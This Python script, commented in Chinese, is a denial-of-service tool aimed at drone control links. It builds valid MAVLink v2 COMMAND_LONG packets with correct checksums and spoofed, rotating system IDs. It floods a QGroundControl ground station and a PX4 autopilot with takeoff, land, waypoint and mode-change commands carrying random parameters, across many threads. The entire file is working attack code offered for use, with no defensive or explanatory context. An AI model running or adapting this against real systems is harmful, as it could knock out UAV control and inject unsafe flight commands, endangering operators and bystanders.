import os
import random
import socket
import struct
import threading
import time

# === 目标主机 / 端口 =========================================================
TARGETS = [
    ("192.168.234.1", 14550),   # QGroundControl
    ("192.168.234.129", 18570), # PX4 MAVLink
]

THREAD_COUNT_PER_TARGET = 10    # 通道
DELAY_BETWEEN_PACKETS   = 0.001 # 包间隔,设 0 打满带宽
SYSID_REFRESH_INTERVAL  = 3     # (sysid, command)更换间隔

# === MAVLink 常量 ===========================================================
MAGIC_V2    = 0xFD
MSG_ID      = 76                # COMMAND_LONG
PAYLOAD_LEN = 33                # COMMAND_LONG 正确长度
COMP_ID     = 190               # 固定为 QGC
CRC_EXTRA   = 152               # msgid 76 对应 CRC_EXTRA
# 高耗指令集合
HIGH_LOAD_COMMANDS = [
    22,                         # MAV_CMD_NAV_TAKEOFF
    21,                         # MAV_CMD_NAV_LAND
    16,                         # MAV_CMD_NAV_WAYPOINT
    176                         # MAV_CMD_DO_SET_MODE
]

# === CRC-X25 ===============================================================
def x25_crc_accumulate(byte: int, crc: int) -> int:
    tmp = byte ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    return ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF

def x25_crc(frame: bytes, crc_extra: int) -> int:
    crc = 0xFFFF
    for b in frame:
        crc = x25_crc_accumulate(b, crc)
    return x25_crc_accumulate(crc_extra, crc)

# === 全局（sysid + command）============================================
STATE_LOCK         = threading.Lock()
CURRENT_SYSID      = random.randint(1, 255)
CURRENT_COMMAND_ID = random.choice(HIGH_LOAD_COMMANDS)
STATE_LAST_SWITCH  = time.time()

def refresh_state_if_needed() -> None:
    global CURRENT_SYSID, CURRENT_COMMAND_ID, STATE_LAST_SWITCH
    now = time.time()
    if now - STATE_LAST_SWITCH > SYSID_REFRESH_INTERVAL:
        CURRENT_SYSID      = random.randint(1, 255)
        CURRENT_COMMAND_ID = random.choice(HIGH_LOAD_COMMANDS)
        STATE_LAST_SWITCH  = now

def get_state() -> tuple[int, int]:
    with STATE_LOCK:
        refresh_state_if_needed()
        return CURRENT_SYSID, CURRENT_COMMAND_ID

# === 报文生成 ===============================================================
def build_packet() -> bytes:
    sysid, cmd = get_state()
    header_wo_magic = bytes([
        PAYLOAD_LEN, 0x00, 0x00, # len, incompat, compat
        0xFF,                    # seq 固定
        sysid, COMP_ID,          # sysid, compid
        MSG_ID & 0xFF,
        (MSG_ID >> 8) & 0xFF,
        (MSG_ID >> 16) & 0xFF
    ])
    params = struct.unpack("<7f", os.urandom(28))
    payload = struct.pack(
        "<7fHBBB",
        *params,          # param1-param7
        cmd,              # command (高耗)
        1,                # target_system
        1,                # target_component
        0                 # confirmation
    )
    crc = x25_crc(header_wo_magic + payload, CRC_EXTRA)
    return bytes([MAGIC_V2]) + header_wo_magic + payload + struct.pack("<H", crc)

# === 攻击线程 ===============================================================
running = True

def attack_target(ip: str, port: int, tid: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((ip, port))     
    sent = 0
    while running:
        try:
            sock.sendall(build_packet())
            sent += 1
            if DELAY_BETWEEN_PACKETS:
                time.sleep(DELAY_BETWEEN_PACKETS)
        except Exception as e:
            print(f"[T{tid}] send error {ip}:{port} → {e}")
            break
    sock.close()
    print(f"[T{tid}] stopped, sent {sent} packets → {ip}:{port}")

# === 主函数 ================================================================
def main():
    global running
    print(f"[INFO] DoS started: {len(TARGETS)} targets × {THREAD_COUNT_PER_TARGET} threads. Ctrl+C to stop.\n")
    threads, tid = [], 0
    for ip, port in TARGETS:
        for _ in range(THREAD_COUNT_PER_TARGET):
            t = threading.Thread(target=attack_target, args=(ip, port, tid))
            t.start()
            threads.append(t)
            tid += 1
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] stopping ...")
        running = False
        for t in threads:
            t.join()
        print("[INFO] all threads exited. DoS finished.")

if __name__ == "__main__":
    main()
